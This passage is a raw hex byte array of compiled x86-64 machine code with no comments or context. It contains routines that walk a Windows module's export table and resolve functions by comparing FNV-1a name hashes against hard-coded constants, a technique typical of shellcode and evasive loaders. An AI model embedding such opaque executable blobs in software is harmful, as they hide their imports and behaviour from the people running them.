	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x6D, 0x0A, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x86, 0x74, 0xAA, 0xDF, 0xD6, 0x71,
	0xEE, 0x65, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xB8, 0x99, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x94,
	0x99, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x4D, 0x45, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x86, 0x99, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x7F, 0x99, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x6A, 0x99, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x43, 0x99, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x29,
	0x99, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x0F, 0x99, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xF5, 0x98, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xB2, 0x98,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x1D, 0x09, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x19, 0xD0, 0xD3, 0xEA, 0xBF, 0x3A,
	0x88, 0x7B, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x68, 0x98, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x44,
	0x98, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xFD, 0x43, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x36, 0x98, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x2F, 0x98, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x1A, 0x98, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xF3, 0x97, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xD9,
	0x97, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xBF, 0x97, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xA5, 0x97, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x62, 0x97,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xCD, 0x07, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xA2, 0x95, 0x45, 0xAC, 0xD9, 0x23,
	0x28, 0x7F, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x18, 0x97, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xF4,
	0x96, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xAD, 0x42, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xE6, 0x96, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xDF, 0x96, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xCA, 0x96, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xA3, 0x96, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x89,
	0x96, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x6F, 0x96, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x55, 0x96, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x12, 0x96,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x7D, 0x06, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xDC, 0xEA, 0x6E, 0x6A, 0xC8, 0x72,
	0x62, 0x7F, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xC8, 0x95, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xDC,
	0xB6, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x9D, 0xD4, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0xCE, 0xB6, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xC7, 0xB6, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x8C,
	0xB6, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xBD, 0xD5, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x7E, 0xB6, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x77, 0xB6, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x8C,
	0xB6, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xDD, 0xD6, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x7E, 0xB6, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x77, 0xB6, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x74,
	0xB6, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xFD, 0xD7, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x66, 0xB6, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x5F, 0xB6, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x3C,
	0xB6, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x1D, 0xD9, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x2E, 0xB6, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x27, 0xB6, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x34,
	0xB6, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x3D, 0xDA, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x26, 0xB6, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x1F, 0xB6, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x94,
	0xB5, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x5D, 0xDB, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x86, 0xB5, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x7F, 0xB5, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x4C,
	0xB5, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x7D, 0xDC, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x3E, 0xB5, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x37, 0xB5, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x64,
	0xB5, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x9D, 0xDD, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x56, 0xB5, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x4F, 0xB5, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xBC,
	0xB4, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xBD, 0xDE, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0xAE, 0xB4, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xA7, 0xB4, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x5C,
	0xB4, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xDD, 0xDF, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x4E, 0xB4, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x47, 0xB4, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xBC,
	0xB4, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xFD, 0xE0, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0xAE, 0xB4, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xA7, 0xB4, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x4C,
	0xB4, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x1D, 0xE2, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x3E, 0xB4, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x37, 0xB4, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xA4,
	0xB4, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x3D, 0xE3, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x96, 0xB4, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x8F, 0xB4, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xC4,
	0xB3, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x5D, 0xE4, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0xB6, 0xB3, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xAF, 0xB3, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xB4,
	0xB3, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x7D, 0xE5, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0xA6, 0xB3, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x9F, 0xB3, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x3C,
	0xB4, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x9D, 0xE6, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x2E, 0xB4, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x27, 0xB4, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xFC,
	0xB3, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xBD, 0xE7, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0xEE, 0xB3, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xE7, 0xB3, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x34,
	0xB3, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xDD, 0xE8, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x26, 0xB3, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x1F, 0xB3, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x44,
	0xB3, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xFD, 0xE9, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x36, 0xB3, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x2F, 0xB3, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x8C,
	0xB2, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x1D, 0xEB, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x7E, 0xB2, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x77, 0xB2, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x54,
	0xB2, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x3D, 0xEC, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x46, 0xB2, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x3F, 0xB2, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x84,
	0xB2, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x5D, 0xED, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x76, 0xB2, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x6F, 0xB2, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xBC,
	0xB2, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x7D, 0xEE, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0xAE, 0xB2, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xA7, 0xB2, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xB4,
	0xB2, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x9D, 0xEF, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0xA6, 0xB2, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x9F, 0xB2, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xFC,
	0xB1, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xBD, 0xF0, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0xEE, 0xB1, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xE7, 0xB1, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x74,
	0xB1, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xDD, 0xF1, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x66, 0xB1, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x5F, 0xB1, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x64,
	0xB1, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xFD, 0xF2, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x56, 0xB1, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x4F, 0xB1, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0xDC,
	0xB1, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x1D, 0xF4, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0xCE, 0xB1, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xC7, 0xB1, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x84,
	0xB1, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x3D, 0xF5, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x76, 0xB1, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x6F, 0xB1, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x24,
	0xB1, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x5D, 0xF6, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x16, 0xB1, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x0F, 0xB1, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x8C,
	0xB0, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x7D, 0xF7, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x7E, 0xB0, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x77, 0xB0, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0x3D, 0x7C,
	0xB0, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x9D, 0xF8, 0xFF, 0xFF, 0x48,
	0x89, 0x05, 0x6E, 0xB0, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x67, 0xB0, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC,
	0x18, 0x48, 0xB8, 0x25, 0x23, 0x22, 0x84, 0xE4, 0x9C, 0xF2, 0xCB, 0x48,
